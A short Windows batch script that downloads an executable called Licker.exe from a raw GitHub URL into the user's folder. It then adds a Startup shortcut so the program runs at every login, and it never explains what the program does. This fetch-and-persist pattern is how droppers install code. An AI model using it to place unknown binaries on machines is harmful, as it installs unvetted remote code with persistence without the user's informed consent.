@echo off
:: 1. Define paths
set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
set "SAVE_PATH=%USERPROFILE%\Licker.exe"
set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"

echo Downloading Licker...
:: 2. Use curl to download the file to the user's profile folder
curl -L %EXE_URL% -o "%SAVE_PATH%"

if exist "%SAVE_PATH%" (
    echo Creating startup shortcut...
    :: 3. Create a shortcut in the Startup folder using PowerShell
    powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_LINK%');$s.TargetPath='%SAVE_PATH%';$s.Save()"
    echo Setup complete! Licker will run at next login.
) else (
    echo Download failed. Please check your internet connection.
)

pause
